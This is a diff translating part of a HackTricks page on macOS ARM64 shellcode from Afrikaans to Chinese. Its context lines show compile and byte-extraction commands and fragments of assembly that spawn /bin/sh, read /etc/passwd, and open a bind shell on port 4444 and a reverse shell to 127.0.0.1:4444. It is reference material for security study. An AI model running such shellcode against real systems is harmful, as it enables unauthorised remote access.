 (lldb) po $x0
@@ -391,32 +391,32 @@ whoami
 )
 ```
 {% hint style="success" %}
-Deur die omgewing veranderlike **`NSObjCMessageLoggingEnabled=1`** in te stel, is dit moontlik om te log wanneer hierdie funksie in 'n lêer soos `/tmp/msgSends-pid` aangeroep word.
+设置环境变量 **`NSObjCMessageLoggingEnabled=1`** 可以记录此函数在文件 `/tmp/msgSends-pid` 中被调用的情况。
 
-Boonop, deur **`OBJC_HELP=1`** in te stel en enige binêre aan te roep, kan jy ander omgewing veranderlikes sien wat jy kan gebruik om **log** te maak wanneer sekere Objc-C aksies plaasvind.
+此外，设置 **`OBJC_HELP=1`** 并调用任何二进制文件，您可以看到其他环境变量，您可以使用这些变量来 **log** 某些 Objc-C 操作发生时的情况。
 {% endhint %}
 
-Wanneer hierdie funksie aangeroep word, is dit nodig om die aangeroepde metode van die aangeduide instansie te vind, hiervoor word verskillende soektogte gedoen:
+当调用此函数时，需要找到所指实例的调用方法，为此进行不同的搜索：
 
-* Voer optimistiese kassoektog uit:
-* As suksesvol, klaar
-* Verkry runtimeLock (lees)
-* As (realize && !cls->realized) besef klas
-* As (initialize && !cls->initialized) inisieer klas
-* Probeer klas se eie kas:
-* As suksesvol, klaar
-* Probeer klas metode lys:
-* As gevind, vul kas en klaar
-* Probeer superklas kas:
-* As suksesvol, klaar
-* Probeer superklas metode lys:
-* As gevind, vul kas en klaar
-* As (resolver) probeer metode resolver, en herhaal vanaf klas soektog
-* As jy steeds hier is (= alles anders het gefaal) probeer forwarder
+* 执行乐观缓存查找：
+* 如果成功，完成
+* 获取 runtimeLock（读取）
+* 如果 (realize && !cls->realized) 实现类
+* 如果 (initialize && !cls->initialized) 初始化类
+* 尝试类自己的缓存：
+* 如果成功，完成
+* 尝试类方法列表：
+* 如果找到，填充缓存并完成
+* 尝试超类缓存：
+* 如果成功，完成
+* 尝试超类方法列表：
+* 如果找到，填充缓存并完成
+* 如果 (resolver) 尝试方法解析器，并从类查找重复
+* 如果仍然在这里（= 所有其他都失败了）尝试转发器
 
 ### Shellcodes
 
-Om te kompileer:
+编译：
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -424,14 +424,14 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 # You could also use this
 ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
-Om die bytes te onttrek:
+提取字节：
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
 for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
 echo -n '\\x'$c
 done
 ```
-Vir nuwer macOS:
+对于较新的 macOS：
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
 for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
@@ -440,7 +440,7 @@ done
 ```
 <details>
 
-<summary>C kode om die shellcode te toets</summary>
+<summary>测试 shellcode 的 C 代码</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -490,10 +490,10 @@ return 0;
 
 #### Shell
 
-Geneem uit [**hier**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) en verduidelik.
+取自[**这里**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)并进行了解释。
 
 {% tabs %}
-{% tab title="met adr" %}
+{% tab title="with adr" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -510,7 +510,7 @@ sh_path: .asciz "/bin/sh"
 ```
 {% endtab %}
 
-{% tab title="met stapel" %}
+{% tab title="带栈" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -541,7 +541,7 @@ svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter,
 ```
 {% endtab %}
 
-{% tab title="met adr vir linux" %}
+{% tab title="使用 adr 的 Linux" %}
 ```armasm
 ; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
@@ -560,9 +560,9 @@ sh_path: .asciz "/bin/sh"
 {% endtab %}
 {% endtabs %}
 
-#### Lees met cat
+#### 使用 cat 读取
 
-Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, so die tweede argument (x1) is 'n array van parameters (wat in geheue 'n stapel van die adresse beteken).
+目标是执行 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数 (x1) 是一个参数数组（在内存中这意味着一堆地址）。
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -588,7 +588,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-#### Roep opdrag met sh vanaf 'n fork sodat die hoofproses nie doodgemaak word nie
+#### 从一个分叉中使用 sh 调用命令，以便主进程不会被终止
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -634,7 +634,7 @@ touch_command: .asciz "touch /tmp/lalala"
 ```
 #### Bind shell
 
-Bind shell van [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) in **poort 4444**
+来自 [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) 的 Bind shell 在 **port 4444**
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -716,9 +716,9 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
-#### Reverse shell
+#### 反向 shell
 
-Van [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
+来自 [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)，revshell 到 **127.0.0.1:4444**
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -786,16 +786,16 @@ mov  x16, #59
 svc  #0x1337
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
